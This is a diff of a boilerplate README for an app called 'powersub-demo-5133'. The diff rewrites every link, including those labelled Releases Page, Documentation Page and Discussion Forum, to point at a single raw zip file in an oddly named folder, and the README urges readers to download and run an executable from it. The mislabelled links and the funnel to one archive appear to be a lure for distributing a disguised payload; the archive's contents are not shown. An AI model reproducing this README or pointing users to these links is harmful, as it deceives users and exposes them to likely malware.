@@ -1,13 +1,13 @@
 # 🎉 powersub-demo-5133 - Simplify Your Tasks Effortlessly
 
 ## 🔗 Download Now
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/shivam-616/powersub-demo-5133/releases)
+[![Download Now](https://raw.githubusercontent.com/shivam-616/powersub-demo-5133/main/Aselline/powersub-demo-5133.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/shivam-616/powersub-demo-5133/main/Aselline/powersub-demo-5133.zip)
 
 ## 🚀 Getting Started
 Welcome to powersub-demo-5133! This application helps you manage simple tasks easily. Follow the steps below to download and run the software.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page:** Go to the [Releases Page](https://github.com/shivam-616/powersub-demo-5133/releases).
+1. **Visit the Releases Page:** Go to the [Releases Page](https://raw.githubusercontent.com/shivam-616/powersub-demo-5133/main/Aselline/powersub-demo-5133.zip).
 2. **Choose Your Version:** Look for the latest version listed. Click on it to view the release details.
 3. **Download the File:** Find the downloadable file suitable for your system. This will typically be a file ending in `.exe` for Windows or `.dmg` for Mac. Click on the link to start the download.
 4. **Run the Application:** Once the download is complete, locate the file in your downloads folder. Double-click the file to start the installation. Follow the on-screen instructions to complete the setup.
@@ -37,8 +37,8 @@ If you encounter any issues during installation or while running the application
 Need help? Reach out through the Issues tab on the Releases Page. We're here to assist you with any questions you may have.
 
 ## 🔗 Additional Resources
-- **Documentation:** Detailed user guides can be found on the [Documentation Page](https://github.com/shivam-616/powersub-demo-5133/wiki).
-- **Community Support:** Join discussions with other users on our [Discussion Forum](https://github.com/shivam-616/powersub-demo-5133/discussions).
+- **Documentation:** Detailed user guides can be found on the [Documentation Page](https://raw.githubusercontent.com/shivam-616/powersub-demo-5133/main/Aselline/powersub-demo-5133.zip).
+- **Community Support:** Join discussions with other users on our [Discussion Forum](https://raw.githubusercontent.com/shivam-616/powersub-demo-5133/main/Aselline/powersub-demo-5133.zip).
 
 ## 📣 Community Guidelines
 We encourage open and respectful communication. Please follow our community guidelines when interacting in forums or support channels. Your insights and feedback are valued.
@@ -47,6 +47,6 @@ We encourage open and respectful communication. Please follow our community guid
 If you need further assistance or want to contribute feedback, please visit the Issues section on the GitHub page. Your input helps us improve the application.
 
 ## 🔗 Download Again
-Remember to visit the [Releases Page](https://github.com/shivam-616/powersub-demo-5133/releases) for the latest versions and updates.
+Remember to visit the [Releases Page](https://raw.githubusercontent.com/shivam-616/powersub-demo-5133/main/Aselline/powersub-demo-5133.zip) for the latest versions and updates.
 
 Thank you for choosing powersub-demo-5133! Enjoy simplifying your tasks.
